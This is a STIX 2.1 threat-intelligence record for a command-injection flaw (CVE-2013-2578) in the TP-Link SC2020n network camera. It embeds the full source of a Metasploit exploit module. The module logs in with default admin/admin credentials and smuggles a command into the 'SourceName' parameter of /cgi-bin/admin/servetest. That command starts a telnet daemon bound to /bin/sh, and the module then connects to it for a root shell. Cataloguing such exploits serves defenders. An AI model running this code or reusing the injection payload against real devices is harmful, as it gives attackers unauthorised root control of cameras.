{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--27e460b8-17fd-40aa-a84f-7f1f04662438",
    "created": "2024-08-14T17:02:07.542692Z",
    "modified": "2024-08-14T17:02:07.542696Z",
    "name": "TP-Link SC2020n Authenticated Telnet Injection",
    "description": " The TP-Link SC2020n Network Video Camera is vulnerable to OS Command Injection via the web interface. By firing up the telnet daemon it is possible to gain root on the device.  The vulnerability exists at /cgi-bin/admin/servetest, which is accessible with credentials. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/tp_link_sc2020n_authenticated_telnet_injection.rb",
            "external_id": "tp_link_sc2020n_authenticated_telnet_injection.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-2578"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n    include Msf::Exploit::Remote::Telnet\n    include Msf::Exploit::Remote::HttpClient\n\n    def initialize(info = {})\n        super(update_info(info,\n          'Name'        => 'TP-Link SC2020n Authenticated Telnet Injection',\n          'Description' => %q{\n            The TP-Link SC2020n Network Video Camera is vulnerable\n            to OS Command Injection via the web interface. By firing up the telnet daemon,\n            it is possible to gain root on the device.  The vulnerability\n            exists at /cgi-bin/admin/servetest, which is accessible with credentials.\n          },\n          'Author'      =>\n            [\n                'Nicholas Starke <nick@alephvoid.com>'\n            ],\n          'License'         => MSF_LICENSE,\n          'DisclosureDate'  => '2015-12-20',\n          'Privileged'      => true,\n          'Platform'        => 'unix',\n          'Arch'            => ARCH_CMD,\n          'Payload'         =>\n            {\n              'Compat'  => {\n              'PayloadType'    => 'cmd_interact',\n              'ConnectionType' => 'find',\n              },\n            },\n          'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/interact' },\n          'References'      =>\n            [\n              [ 'CVE', '2013-2578']\n            ],\n          'Targets'        =>\n            [\n              [  'Automatic',     { } ],\n            ],\n          'DefaultTarget'  => 0\n         ))\n\n        register_options(\n          [\n            OptString.new('HttpUsername', [ true, 'User to login with', 'admin']),\n            OptString.new('HttpPassword', [ true, 'Password to login with', 'admin'])\n          ])\n\n        register_advanced_options(\n          [\n            OptInt.new('TelnetTimeout', [ true, 'The number of seconds to wait for a reply from a Telnet Command', 10]),\n            OptInt.new('TelnetBannerTimeout', [ true, 'The number of seconds to wait for the initial banner', 25])\n          ])\n    end\n\n    # This module returns false positives for credentialed logins\n    def autofilter\n      false\n    end\n\n    def telnet_timeout\n      (datastore['TelnetTimeout'] || 10).to_i\n    end\n\n    def banner_timeout\n      (datastore['TelnetBannerTimeout'] || 25).to_i\n    end\n\n    def exploit\n      print_status('Exploiting')\n      user = datastore['HttpUsername']\n      pass = datastore['HttpPassword']\n      test_login(user, pass)\n      exploit_telnet\n    end\n\n\n    def test_login(user, pass)\n        print_status(\"Trying to login with #{user} : #{pass}\")\n        begin\n          res = send_request_cgi({\n            'uri' => '/',\n            'method' => 'GET',\n            'authorization' => basic_auth(user, pass)\n          })\n\n          if res.nil?\n            fail_with(Failure::Unknown, \"Could not connect to web service - no response\")\n          end\n\n          if (res.code != 200)\n            fail_with(Failure::Unknown, \"Could not connect to web service - invalid credentials (response code: #{res.code}\")\n          else\n            print_good(\"Successful login #{user} : #{pass}\")\n            store_valid_credential(user: user, private: pass) # service_name becomes http || https, a conflicting service_details could occur in future. Telnet lib does not yet provide service_details.\n          end\n        rescue ::Rex::ConnectionError\n          fail_with(Failure::Unknown, \"Could not connect to the web service\")\n        end\n    end\n\n    def exploit_telnet\n        telnet_port = rand(32767) + 32768\n\n        print_status(\"Telnet Port: #{telnet_port}\")\n\n        cmd = \"telnetd -p #{telnet_port} -l/bin/sh\"\n\n        telnet_request(cmd)\n\n        print_status(\"Trying to establish telnet connection...\")\n        ctx = { 'Msf' => framework, 'MsfExploit' => self }\n        sock = Rex::Socket.create_tcp({ 'PeerHost' => rhost, 'PeerPort' => telnet_port, 'Context' => ctx, 'Timeout' => telnet_timeout })\n\n        begin\n          if sock.nil?\n            fail_with(Failure::Unreachable, \"Backdoor service unreachable\")\n          end\n\n          add_socket(sock)\n\n          print_status(\"Trying to establish a telnet session...\")\n          prompt = negotiate_telnet(sock)\n\n          if prompt.nil?\n            sock.close\n            fail_with(Failure::Unknown, \"Unable to establish a telnet session\")\n          else\n            print_good(\"Telnet session successfully established\")\n          end\n\n          handler(sock)\n        rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e\n          sock.close if sock\n          fail_with(Failure::Unknown, e.message)\n        end\n    end\n\n    def telnet_request(cmd)\n\n        uri = '/cgi-bin/admin/servetest'\n\n        begin\n          res = send_request_cgi({\n            'uri' => uri,\n            'method' => 'GET',\n            'vars_get' => {\n                'cmd' => 'ftp',\n                'ServerName' => 'test',\n                'userName' => 'test',\n                'Password' => 'test',\n                'Passive' => 'off',\n                'SourceName' => \"/var/ftptest;#{cmd};#\",\n                'TargetName' => 'testfile'\n            }\n          })\n          return res\n        rescue ::Rex::ConnectionError\n          fail_with(Failure::Unreachable, \"Could not connect to the web service\")\n        end\n    end\n\n    def negotiate_telnet(sock)\n      begin\n        Timeout.timeout(banner_timeout) do\n          while(true)\n            data = sock.get_once(-1, telnet_timeout)\n            return nil if not data or data.length == 0\n            if data =~ /#/\n              return true\n            end\n          end\n        end\n      rescue ::Timeout::Error\n        return nil\n      end\n    end\nend\n",
    "x_mitre_disclosure_date": "2015-12-20",
    "x_mitre_platforms": [
        "unix'"
    ]
}